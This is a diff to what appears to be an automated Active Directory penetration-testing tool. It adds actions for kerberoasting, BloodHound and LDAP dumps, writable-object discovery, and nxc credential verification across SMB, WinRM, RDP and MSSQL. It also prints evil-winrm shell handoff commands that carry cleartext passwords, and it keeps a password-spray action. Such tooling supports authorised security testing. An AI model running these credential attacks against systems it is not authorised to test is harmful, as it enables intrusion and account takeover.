@@ -12,6 +12,7 @@ and the session/shell/CVE actions land in later phases.
 """
 from __future__ import annotations
 
+import re
 from pathlib import Path
 
 from lib import nmap
@@ -132,6 +133,11 @@ def _h_asrep_roast(ctx) -> ActionResult:
 def _h_crack(ctx) -> ActionResult:
     from lib import crack
     cracked = crack.crack_hashes(ctx.facts, ctx.runner, ctx.findings, ctx.available)
+    # Record each cracked (user, password) as a targeted pair so creds.test can
+    # verify it as itself instead of spraying it across the whole user list.
+    for user, password in cracked:
+        if user:
+            ctx.facts.add_cred_pair(user, password)
     if cracked:
         return ActionResult(ok=True, summary=f"cracked {len(cracked)} password(s)")
     return ActionResult(ok=True, summary="no hashes cracked")
@@ -161,17 +167,107 @@ def _pick_enum_cred(facts: FactStore) -> tuple[str, str] | None:
     return valids[0] if valids else None
 
 
-def _h_ad_core(ctx) -> ActionResult:
-    from lib import credsmode
+def _enum_cred_or_none(ctx):
+    """(domain, user, pw) for authenticated enum, or None if not ready."""
     domain = ctx.facts.discovered_domain or ctx.domain
     cred = _pick_enum_cred(ctx.facts)
     if not domain or cred is None:
+        return None
+    return domain, cred[0], cred[1]
+
+
+def _h_ldap_domaindump(ctx) -> ActionResult:
+    from lib import credsmode
+    ready = _enum_cred_or_none(ctx)
+    if ready is None:
         return ActionResult(ok=False, summary="need a domain and a valid credential")
-    user, pw = cred
-    credsmode._ad_core(ctx.ip, domain, user, pw, ctx.runner, ctx.findings,
-                       ctx.facts, ctx.available)
+    domain, user, pw = ready
+    credsmode._ad_ldapdomaindump(ctx.ip, domain, user, pw, ctx.runner,
+                                 ctx.findings, ctx.facts, ctx.available)
+    credsmode._ad_enrichment(ctx.ip, domain, user, pw, ctx.runner,
+                             ctx.findings, ctx.facts, ctx.available)
     ctx.facts.set_proto_status("ldap", ProtoStatus.EXHAUSTED)
-    return ActionResult(ok=True, summary=f"authenticated AD enum as {user}")
+    return ActionResult(ok=True, summary=f"LDAP domain dump as {user}")
+
+
+def _h_kerberoast(ctx) -> ActionResult:
+    from lib import credsmode
+    ready = _enum_cred_or_none(ctx)
+    if ready is None:
+        return ActionResult(ok=False, summary="need a domain and a valid credential")
+    domain, user, pw = ready
+    credsmode.sync_clock(ctx.ip, ctx.runner, ctx.findings, ctx.available)
+    n = credsmode._ad_kerberoast(ctx.ip, domain, user, pw, ctx.runner,
+                                 ctx.findings, ctx.facts, ctx.available)
+    if n:
+        ctx.facts.add_hash("kerberoast")
+    return ActionResult(ok=True, summary=f"{n} kerberoastable hash(es)")
+
+
+def _h_bloodhound(ctx) -> ActionResult:
+    from lib import credsmode
+    ready = _enum_cred_or_none(ctx)
+    if ready is None:
+        return ActionResult(ok=False, summary="need a domain and a valid credential")
+    domain, user, pw = ready
+    zip_path = credsmode._ad_bloodhound(ctx.ip, domain, user, pw, ctx.runner,
+                                        ctx.findings, ctx.facts, ctx.available)
+    return ActionResult(ok=True,
+                        summary=f"bloodhound: {zip_path.name if zip_path else 'no data'}")
+
+
+def _h_writable_objects(ctx) -> ActionResult:
+    from lib import credsmode
+    ready = _enum_cred_or_none(ctx)
+    if ready is None:
+        return ActionResult(ok=False, summary="need a domain and a valid credential")
+    domain, user, pw = ready
+    targets = credsmode._bloodyad_writable(ctx.ip, domain, user, pw, ctx.runner,
+                                           ctx.findings, ctx.facts, ctx.available)
+    return ActionResult(ok=True, summary=f"{len(targets or [])} writable object(s)")
+
+
+# ── yellow: credential access test (verify pairs as-is — no spray) ────────────
+def _h_creds_test(ctx) -> ActionResult:
+    """Test each known credential pair (cracked pairs + confirmed valid creds)
+    against the open auth services as that exact (user, pass) — verification, not
+    a user-list spray. Confirmed access is recorded and a handoff command shown."""
+    snap = ctx.facts.snapshot()
+    pairs = sorted(set(snap["cred_pairs"]) | set(snap["valid_creds"]))
+    if not pairs:
+        return ActionResult(ok=False, summary="no credential pairs to test")
+    if "nxc" not in ctx.available:
+        return ActionResult(ok=False, summary="nxc not available")
+    open_tcp = {p for proto, p in snap["open_ports"] if proto == "tcp"}
+    domain = ctx.facts.discovered_domain or ctx.domain or ""
+    services = [("smb", 445), ("winrm", 5985), ("rdp", 3389), ("mssql", 1433)]
+    confirmed = 0
+    for user, pw in pairs:
+        for svc, port in services:
+            if port not in open_tcp:
+                continue
+            cmd = ["nxc", svc, ctx.ip, "-u", user, "-p", pw]
+            if domain:
+                cmd += ["-d", domain]
+            label = re.sub(r"[^a-z0-9]", "_", f"{svc}_{user}".lower())[:24]
+            out = ctx.runner.run(cmd, f"credtest_{label}", timeout=60)
+            for line in out.splitlines():
+                if "[+]" not in line:
+                    continue
+                confirmed += 1
+                if "Pwn3d!" in line:
+                    ctx.facts.add_admin_cred(user, pw)
+                    ctx.findings.bullet(f"**ADMIN access ({svc}):** `{user}` — {line.strip()}")
+                    ctx.findings.add_summary(f"**Admin {svc.upper()} as `{user}`**")
+                else:
+                    ctx.facts.add_valid_cred(user, pw, svc.upper())
+                    ctx.findings.bullet(f"**Valid {svc} access:** `{user}` — {line.strip()}")
+                if svc == "winrm":
+                    ctx.findings.add_summary(
+                        f"WinRM shell handoff: `evil-winrm -i {ctx.ip} -u {user} -p {pw}`")
+                break
+    return ActionResult(ok=True,
+                        summary=f"tested {len(pairs)} pair(s) — {confirmed} access hit(s)")
 
 
 def build_registry() -> ActionRegistry:
@@ -257,10 +353,23 @@ def build_registry() -> ActionRegistry:
     ))
 
     reg.register(Action(
-        "creds.spray", Tier.YELLOW, _h_creds_spray,
+        "creds.test", Tier.YELLOW, _h_creds_test,
         group="creds", order=2,
         footprint=Footprint(
-            summary="spray candidate password(s) across the user list (SMB/WinRM)",
+            summary="verify known credential pair(s) for access — not a spray",
+            windows_events=("4624 (logon) on a hit", "4625 (failed logon)"),
+        ),
+        gate=lambda f: (f.has("cred_pair") or f.has("valid_cred")) and f.has("tcp/445"),
+        requires=(Requirement("cred_pair", "a credential pair (cracked/known)"),
+                  Requirement("tcp/445", "SMB (tcp/445) open")),
+        deps=("nxc",),
+    ))
+
+    reg.register(Action(
+        "creds.spray", Tier.YELLOW, _h_creds_spray,
+        group="creds", order=3,
+        footprint=Footprint(
+            summary="spray candidate password(s) across the whole user list (SMB/WinRM)",
             windows_events=("4625 (failed logon)", "4624 (logon) on a hit"),
         ),
         gate=lambda f: f.has("cred") and f.has("tcp/445"),
@@ -269,17 +378,42 @@ def build_registry() -> ActionRegistry:
         deps=("nxc",),
     ))
 
+    # Authenticated AD enumeration, decomposed into one-decision-per-action steps
+    # (replacing the monolithic ad.authenticated_core). All gated valid_cred+domain.
+    _authed = lambda f: f.has("valid_cred") and f.has("domain")  # noqa: E731
+    _authed_reqs = (Requirement("valid_cred", "a valid credential"),
+                    Requirement("domain", "a domain"))
+
     reg.register(Action(
-        "ad.authenticated_core", Tier.YELLOW, _h_ad_core,
+        "ldap.domaindump", Tier.YELLOW, _h_ldap_domaindump,
+        group="ldap", order=2,
+        footprint=Footprint(
+            summary="authenticated LDAP dump + enrichment (delegation/MAQ/policy)",
+            windows_events=("4662 (directory reads)",)),
+        gate=_authed, requires=_authed_reqs, deps=("ldapdomaindump",),
+    ))
+    reg.register(Action(
+        "kerberos.kerberoast", Tier.YELLOW, _h_kerberoast,
+        group="kerberos", order=2,
+        footprint=Footprint(
+            summary="request TGS for SPN accounts → crackable hashes",
+            windows_events=("4769 (TGS requested)",)),
+        gate=_authed, requires=_authed_reqs, deps=("impacket-GetUserSPNs",),
+    ))
+    reg.register(Action(
+        "bloodhound.collect", Tier.YELLOW, _h_bloodhound,
         group="ad", order=1,
         footprint=Footprint(
-            summary="authenticated AD enum: ldapdomaindump, kerberoast, "
-                    "BloodHound, ADCS, secretsdump-if-admin",
-            windows_events=("4769 (TGS — kerberoast)", "4662 (directory reads)"),
-        ),
-        gate=lambda f: f.has("valid_cred") and f.has("domain"),
-        requires=(Requirement("valid_cred", "a valid credential"),
-                  Requirement("domain", "a domain")),
+            summary="BloodHound collection (All, DCOnly fallback) → attack paths",
+            windows_events=("4662 (directory reads)",)),
+        gate=_authed, requires=_authed_reqs, deps=("bloodhound-python",),
+    ))
+    reg.register(Action(
+        "ad.writable_objects", Tier.YELLOW, _h_writable_objects,
+        group="ad", order=2,
+        footprint=Footprint(
+            summary="enumerate writable users/groups/computers (privesc targets)"),
+        gate=_authed, requires=_authed_reqs, deps=("bloodyAD",),
     ))
 
     return reg
